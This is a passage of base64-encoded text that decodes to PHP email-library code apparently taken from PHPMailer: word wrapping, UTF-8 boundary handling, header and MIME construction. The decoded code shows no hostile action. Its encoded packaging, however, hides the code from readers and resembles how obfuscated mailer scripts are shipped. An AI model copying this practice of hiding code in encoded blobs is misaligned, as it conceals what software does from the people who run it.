ZGUoJHRoaXMtPkxFLCAkbWVzc2FnZSk7DQogICAgICAgICRtZXNzYWdlID0gJyc7DQogICAgICAgIGZvcmVhY2ggKCRsaW5lcyBhcyAkbGluZSkgew0KICAgICAgICAgICAgJHdvcmRzICAgICA9IGV4cGxvZGUoJyAnLCAkbGluZSk7DQogICAgICAgICAgICAkYnVmICAgICAgID0gJyc7DQogICAgICAgICAgICAkZmlyc3R3b3JkID0gdHJ1ZTsNCiAgICAgICAgICAgIGZvcmVhY2ggKCR3b3JkcyBhcyAkd29yZCkgew0KICAgICAgICAgICAgICAgIGlmICgkcXBfbW9kZSBhbmQgKHN0cmxlbigkd29yZCkgPiAkbGVuZ3RoKSkgew0KICAgICAgICAgICAgICAgICAgICAkc3BhY2VfbGVmdCA9ICRsZW5ndGggLSBzdHJsZW4oJGJ1ZikgLSAkY3JsZmxlbjsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCEkZmlyc3R3b3JkKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHNwYWNlX2xlZnQgPiAyMCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsZW4gPSAkc3BhY2VfbGVmdDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGlzX3V0ZjgpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9ICR0aGlzLT51dGY4Q2hhckJvdW5kYXJ5KCR3b3JkLCAkbGVuKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2VpZiAoc3Vic3RyKCR3b3JkLCAkbGVuIC0gMSwgMSkgPT0gJz0nKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsZW4tLTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2VpZiAoc3Vic3RyKCR3b3JkLCAkbGVuIC0gMiwgMSkgPT0gJz0nKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsZW4gLT0gMjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhcnQgPSBzdWJzdHIoJHdvcmQsIDAsICRsZW4pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICR3b3JkID0gc3Vic3RyKCR3b3JkLCAkbGVuKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYnVmIC49ICcgJyAuICRwYXJ0Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlIC49ICRidWYgLiBzcHJpbnRmKCc9JXMnLCBzZWxmOjpDUkxGKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJGJ1ZiAuICRzb2Z0X2JyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgJGJ1ZiA9ICcnOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIHdoaWxlIChzdHJsZW4oJHdvcmQpID4gMCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRsZW5ndGggPD0gMCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9ICRsZW5ndGg7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGlzX3V0ZjgpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuID0gJHRoaXMtPnV0ZjhDaGFyQm91bmRhcnkoJHdvcmQsICRsZW4pOw0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlaWYgKHN1YnN0cigkd29yZCwgJGxlbiAtIDEsIDEpID09ICc9Jykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsZW4tLTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZWlmIChzdWJzdHIoJHdvcmQsICRsZW4gLSAyLCAxKSA9PSAnPScpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuIC09IDI7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAkcGFydCA9IHN1YnN0cigkd29yZCwgMCwgJGxlbik7DQogICAgICAgICAgICAgICAgICAgICAgICAkd29yZCA9IHN1YnN0cigkd29yZCwgJGxlbik7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoc3RybGVuKCR3b3JkKSA+IDApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSAuPSAkcGFydCAuIHNwcmludGYoJz0lcycsIHNlbGY6OkNSTEYpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYnVmID0gJHBhcnQ7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkYnVmX28gPSAkYnVmOw0KICAgICAgICAgICAgICAgICAgICBpZiAoISRmaXJzdHdvcmQpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRidWYgLj0gJyAnOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICRidWYgLj0gJHdvcmQ7DQogICAgICAgICAgICAgICAgICAgIGlmIChzdHJsZW4oJGJ1ZikgPiAkbGVuZ3RoIGFuZCAkYnVmX28gIT0gJycpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlIC49ICRidWZfbyAuICRzb2Z0X2JyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgJGJ1ZiA9ICR3b3JkOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRmaXJzdHdvcmQgPSBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRtZXNzYWdlIC49ICRidWYgLiBzZWxmOjpDUkxGOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkbWVzc2FnZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHV0ZjhDaGFyQm91bmRhcnkoJGVuY29kZWRUZXh0LCAkbWF4TGVuZ3RoKSB7DQogICAgICAgICRmb3VuZFNwbGl0UG9zID0gZmFsc2U7DQogICAgICAgICRsb29rQmFjayAgICAgID0gMzsNCiAgICAgICAgd2hpbGUgKCEkZm91bmRTcGxpdFBvcykgew0KICAgICAgICAgICAgJGxhc3RDaHVuayAgICAgID0gc3Vic3RyKCRlbmNvZGVkVGV4dCwgJG1heExlbmd0aCAtICRsb29rQmFjaywgJGxvb2tCYWNrKTsNCiAgICAgICAgICAgICRlbmNvZGVkQ2hhclBvcyA9IHN0cnBvcygkbGFzdENodW5rLCAnPScpOw0KICAgICAgICAgICAgaWYgKGZhbHNlICE9PSAkZW5jb2RlZENoYXJQb3MpIHsNCiAgICAgICAgICAgICAgICAkaGV4ID0gc3Vic3RyKCRlbmNvZGVkVGV4dCwgJG1heExlbmd0aCAtICRsb29rQmFjayArICRlbmNvZGVkQ2hhclBvcyArIDEsIDIpOw0KICAgICAgICAgICAgICAgICRkZWMgPSBoZXhkZWMoJGhleCk7DQogICAgICAgICAgICAgICAgaWYgKCRkZWMgPCAxMjgpIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRlbmNvZGVkQ2hhclBvcyA+IDApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRtYXhMZW5ndGggPSAkbWF4TGVuZ3RoIC0gKCRsb29rQmFjayAtICRlbmNvZGVkQ2hhclBvcyk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgJGZvdW5kU3BsaXRQb3MgPSB0cnVlOw0KICAgICAgICAgICAgICAgIH0gZWxzZWlmICgkZGVjID49IDE5Mikgew0KICAgICAgICAgICAgICAgICAgICAkbWF4TGVuZ3RoICAgICA9ICRtYXhMZW5ndGggLSAoJGxvb2tCYWNrIC0gJGVuY29kZWRDaGFyUG9zKTsNCiAgICAgICAgICAgICAgICAgICAgJGZvdW5kU3BsaXRQb3MgPSB0cnVlOw0KICAgICAgICAgICAgICAgIH0gZWxzZWlmICgkZGVjIDwgMTkyKSB7DQogICAgICAgICAgICAgICAgICAgICRsb29rQmFjayArPSAzOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgJGZvdW5kU3BsaXRQb3MgPSB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkbWF4TGVuZ3RoOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gc2V0V29yZFdyYXAoKSB7DQogICAgICAgIGlmICgkdGhpcy0+V29yZFdyYXAgPCAxKSB7DQogICAgICAgICAgICByZXR1cm47DQogICAgICAgIH0NCiAgICAgICAgc3dpdGNoICgkdGhpcy0+bWVzc2FnZV90eXBlKSB7DQogICAgICAgICAgICBjYXNlICdhbHQnOg0KICAgICAgICAgICAgY2FzZSAnYWx0X2lubGluZSc6DQogICAgICAgICAgICBjYXNlICdhbHRfYXR0YWNoJzoNCiAgICAgICAgICAgIGNhc2UgJ2FsdF9pbmxpbmVfYXR0YWNoJzoNCiAgICAgICAgICAgICAgICAkdGhpcy0+QWx0Qm9keSA9ICR0aGlzLT53cmFwVGV4dCgkdGhpcy0+QWx0Qm9keSwgJHRoaXMtPldvcmRXcmFwKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgJHRoaXMtPkJvZHkgPSAkdGhpcy0+d3JhcFRleHQoJHRoaXMtPkJvZHksICR0aGlzLT5Xb3JkV3JhcCk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGNyZWF0ZUhlYWRlcigpIHsNCiAgICAgICAgJHJlc3VsdCA9ICcnOw0KICAgICAgICBpZiAoJHRoaXMtPk1lc3NhZ2VEYXRlID09ICcnKSB7DQogICAgICAgICAgICAkdGhpcy0+TWVzc2FnZURhdGUgPSBzZWxmOjpyZmNEYXRlKCk7DQogICAgICAgIH0NCiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnRGF0ZScsICR0aGlzLT5NZXNzYWdlRGF0ZSk7DQogICAgICAgIGlmICgkdGhpcy0+U2luZ2xlVG8pIHsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+TWFpbGVyICE9ICdtYWlsJykgew0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKCR0aGlzLT50byBhcyAkdG9hZGRyKSB7DQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5TaW5nbGVUb0FycmF5W10gPSAkdGhpcy0+YWRkckZvcm1hdCgkdG9hZGRyKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBpZiAoY291bnQoJHRoaXMtPnRvKSA+IDApIHsNCiAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPk1haWxlciAhPSAnbWFpbCcpIHsNCiAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+YWRkckFwcGVuZCgnVG8nLCAkdGhpcy0+dG8pOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gZWxzZWlmIChjb3VudCgkdGhpcy0+Y2MpID09IDApIHsNCiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdUbycsICd1bmRpc2Nsb3NlZC1yZWNpcGllbnRzOjsnKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5hZGRyQXBwZW5kKCdGcm9tJywgYXJyYXkoDQogICAgICAgICAgICBhcnJheSgNCiAgICAgICAgICAgICAgICB0cmltKCR0aGlzLT5Gcm9tKSwNCiAgICAgICAgICAgICAgICAkdGhpcy0+RnJvbU5hbWUNCiAgICAgICAgICAgICkNCiAgICAgICAgKSk7DQogICAgICAgIGlmIChjb3VudCgkdGhpcy0+Y2MpID4gMCkgew0KICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+YWRkckFwcGVuZCgnQ2MnLCAkdGhpcy0+Y2MpOw0KICAgICAgICB9DQogICAgICAgIGlmICgoJHRoaXMtPk1haWxlciA9PSAnc2VuZG1haWwnIG9yICR0aGlzLT5NYWlsZXIgPT0gJ3FtYWlsJyBvciAkdGhpcy0+TWFpbGVyID09ICdtYWlsJykgYW5kIGNvdW50KCR0aGlzLT5iY2MpID4gMCkgew0KICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+YWRkckFwcGVuZCgnQmNjJywgJHRoaXMtPmJjYyk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGNvdW50KCR0aGlzLT5SZXBseVRvKSA+IDApIHsNCiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmFkZHJBcHBlbmQoJ1JlcGx5LVRvJywgJHRoaXMtPlJlcGx5VG8pOw0KICAgICAgICB9DQogICAgICAgIGlmICgkdGhpcy0+TWFpbGVyICE9ICdtYWlsJykgew0KICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnU3ViamVjdCcsICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkdGhpcy0+U3ViamVjdCkpKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJycgIT0gJHRoaXMtPk1lc3NhZ2VJRCBhbmQgcHJlZ19tYXRjaCgnL148LipALio+JC8nLCAkdGhpcy0+TWVzc2FnZUlEKSkgew0KICAgICAgICAgICAgJHRoaXMtPmxhc3RNZXNzYWdlSUQgPSAkdGhpcy0+TWVzc2FnZUlEOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHRoaXMtPmxhc3RNZXNzYWdlSUQgPSBzcHJpbnRmKCc8JXNAJXM+JywgJHRoaXMtPnVuaXF1ZWlkLCAkdGhpcy0+c2VydmVySG9zdG5hbWUoKSk7DQogICAgICAgIH0NCiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnTWVzc2FnZS1JRCcsICR0aGlzLT5sYXN0TWVzc2FnZUlEKTsNCiAgICAgICAgaWYgKCFpc19udWxsKCR0aGlzLT5Qcmlvcml0eSkpIHsNCiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ1gtUHJpb3JpdHknLCAkdGhpcy0+UHJpb3JpdHkpOw0KICAgICAgICB9DQogICAgICAgIGlmICgkdGhpcy0+Q29uZmlybVJlYWRpbmdUbyAhPSAnJykgew0KICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnRGlzcG9zaXRpb24tTm90aWZpY2F0aW9uLVRvJywgJzwnIC4gJHRoaXMtPkNvbmZpcm1SZWFkaW5nVG8gLiAnPicpOw0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5DdXN0b21IZWFkZXIgYXMgJGhlYWRlcikgew0KICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSh0cmltKCRoZWFkZXJbMF0pLCAkdGhpcy0+ZW5jb2RlSGVhZGVyKHRyaW0oJGhlYWRlclsxXSkpKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoISR0aGlzLT5zaWduX2tleV9maWxlKSB7DQogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdNSU1FLVZlcnNpb24nLCAnMS4wJyk7DQogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5nZXRNYWlsTUlNRSgpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkcmVzdWx0Ow0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0TWFpbE1JTUUoKSB7DQogICAgICAgICRyZXN1bHQgICAgICA9ICcnOw0KICAgICAgICAkaXNtdWx0aXBhcnQgPSB0cnVlOw0KICAgICAgICBzd2l0Y2ggKCR0aGlzLT5tZXNzYWdlX3R5cGUpIHsNCiAgICAgICAgICAgIGNhc2UgJ2lubGluZSc6DQogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9yZWxhdGVkOycpOw0KICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPnRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsxXSAuICciJyk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdhdHRhY2gnOg0KICAgICAgICAgICAgY2FzZSAnaW5saW5lX2F0dGFjaCc6DQogICAgICAgICAgICBjYXNlICdhbHRfYXR0YWNoJzoNCiAgICAgICAgICAgIGNhc2UgJ2FsdF9pbmxpbmVfYXR0YWNoJzoNCiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCAnbXVsdGlwYXJ0L21peGVkOycpOw0KICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPnRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsxXSAuICciJyk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdhbHQnOg0KICAgICAgICAgICAgY2FzZSAnYWx0X2lubGluZSc6DQogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9hbHRlcm5hdGl2ZTsnKTsNCiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMV0gLiAnIicpOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgnQ29udGVudC1UeXBlOiAnIC4gJHRoaXMtPkNvbnRlbnRUeXBlIC4gJzsgY2hhcnNldD0nIC4gJHRoaXMtPkNoYXJTZXQpOw0KICAgICAgICAgICAgICAgICRpc211bHRpcGFydCA9IGZhbHNlOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9DQogICAgICAgIGlmICgkdGhpcy0+RW5jb2RpbmcgIT0gJzdiaXQnKSB7DQogICAgICAgICAgICBpZiAoJGlzbXVsdGlwYXJ0KSB7DQogICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5FbmNvZGluZyA9PSAnOGJpdCcpIHsNCiAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZycsICc4Yml0Jyk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nJywgJHRoaXMtPkVuY29kaW5nKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBpZiAoJHRoaXMtPk1haWxlciAhPSAnbWFpbCcpIHsNCiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkxFOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkcmVzdWx0Ow0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0U2VudE1JTUVNZXNzYWdlKCkgew0KICAgICAgICByZXR1cm4gcnRyaW0oJHRoaXMtPk1JTUVIZWFkZXIgLiAkdGhpcy0+bWFpbEhlYWRlciwgIlxuXHIiKSAuIHNlbGY6OkNSTEYgLiBzZWxmOjpDUkxGIC4gJHRoaXMtPk1JTUVCb2R5Ow0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZ2VuZXJhdGVJZCgpIHsNCiAgICAgICAgcmV0dXJuIG1kNSh1bmlxaWQodGltZSgpKSk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBjcmVhdGVCb2R5KCkgew0KICAgICAgICAkYm9keSAgICAgICAgICAgICAgPSAnJzsNCiAgICAgICAgJHRoaXMtPnVuaXF1ZWlkICAgID0gJHRoaXMtPmdlbmVyYXRlSWQoKTsNCiAgICAgICAgJHRoaXMtPmJvdW5kYXJ5WzFdID0gJ2IxXycgLiAkdGhpcy0+dW5pcXVlaWQ7DQogICAgICAgICR0aGlzLT5ib3VuZGFyeVsyXSA9ICdiMl8nIC4gJHRoaXMtPnVuaXF1ZWlkOw0KICAgICAgICAkdGhpcy0+Ym91bmRhcnlbM10gPSAnYjNfJyAuICR0aGlzLT51bmlxdWVpZDsNCiAgICAgICAgaWYgKCR0aGlzLT5zaWduX2tleV9maWxlKSB7DQogICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0TWFpbE1JTUUoKSAuICR0aGlzLT5MRTsNCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+c2V0V29yZFdyYXAoKTsNCiAgICAgICAgJGJvZHlFbmNvZGluZyA9ICR0aGlzLT5FbmNvZGluZzsNCiAgICAgICAgJGJvZHlDaGFyU2V0ICA9ICR0aGlzLT5DaGFyU2V0Ow0KICAgICAgICBpZiAoJGJvZHlFbmNvZGluZyA9PSAnOGJpdCcgYW5kICEkdGhpcy0+aGFzOGJpdENoYXJzKCR0aGlzLT5Cb2R5KSkgew0KICAgICAgICAgICAgJGJvZHlFbmNvZGluZyA9ICc3Yml0JzsNCiAgICAgICAgICAgICRib2R5Q2hhclNldCAgPSAndXMtYXNjaWknOw0KICAgICAgICB9DQogICAgICAgIGlmICgnYmFzZTY0JyAhPSAkdGhpcy0+RW5jb2RpbmcgYW5kIHNlbGY6Omhhc0xpbmVMb25nZXJUaGFuTWF4KCR0aGlzLT5Cb2R5KSkgew0KICAgICAgICAgICAgJGJvZHlFbmNvZGluZyA9ICdxdW90ZWQtcHJpbnRhYmxlJzsNCiAgICAgICAgfQ0KICAgICAgICAkYWx0Qm9keUVuY29kaW5nID0gJHRoaXMtPkVuY29kaW5nOw0KICAgICAgICAkYWx0Qm9keUNoYXJTZXQgID0gJHRoaXMtPkNoYXJTZXQ7DQogICAgICAgIGlmICgkYWx0Qm9keUVuY29kaW5nID09ICc4Yml0JyBhbmQgISR0aGlzLT5oYXM4Yml0Q2hhcnMoJHRoaXMtPkFsdEJvZHkpKSB7DQogICAgICAgICAgICAkYWx0Qm9keUVuY29kaW5nID0gJzdiaXQnOw0KICAgICAgICAgICAgJGFsdEJvZHlDaGFyU2V0ICA9ICd1cy1hc2NpaSc7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCdiYXNlNjQnICE9ICRhbHRCb2R5RW5jb2RpbmcgYW5kIHNlbGY6Omhhc0xpbmVMb25nZXJUaGFuTWF4KCR0aGlzLT5BbHRCb2R5KSkgew0KICAgICAgICAgICAgJGFsdEJvZHlFbmNvZGluZyA9ICdxdW90ZWQtcHJpbnRhYmxlJzsNCiAgICAgICAgfQ0KICAgICAgICAkbWltZXByZSA9ICJUaGlzIGlzIGEgbXVsdGktcGFydCBtZXNzYWdlIGluIE1JTUUgZm9ybWF0LiIgLiAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgIHN3aXRjaCAoJHRoaXMtPm1lc3NhZ2VfdHlwZSkgew0KICAgICAgICAgICAgY2FzZSAnaW5saW5lJzoNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdLCAkYm9keUNoYXJTZXQsICcnLCAkYm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkYm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnaW5saW5lJywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ2F0dGFjaCc6DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSwgJGJvZHlDaGFyU2V0LCAnJywgJGJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2F0dGFjaG1lbnQnLCAkdGhpcy0+Ym91bmRhcnlbMV0pOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnaW5saW5lX2F0dGFjaCc6DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCctLScgLiAkdGhpcy0+Ym91bmRhcnlbMV0pOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCAnbXVsdGlwYXJ0L3JlbGF0ZWQ7Jyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsyXSAuICciJyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0sICRib2R5Q2hhclNldCwgJycsICRib2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdpbmxpbmUnLCAkdGhpcy0+Ym91bmRhcnlbMl0pOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdhdHRhY2htZW50JywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ2FsdCc6DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSwgJGFsdEJvZHlDaGFyU2V0LCAndGV4dC9wbGFpbicsICRhbHRCb2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkFsdEJvZHksICRhbHRCb2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdLCAkYm9keUNoYXJTZXQsICd0ZXh0L2h0bWwnLCAkYm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkYm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+SWNhbCkpIHsNCiAgICAgICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSwgJycsICd0ZXh0L2NhbGVuZGFyOyBtZXRob2Q9UkVRVUVTVCcsICcn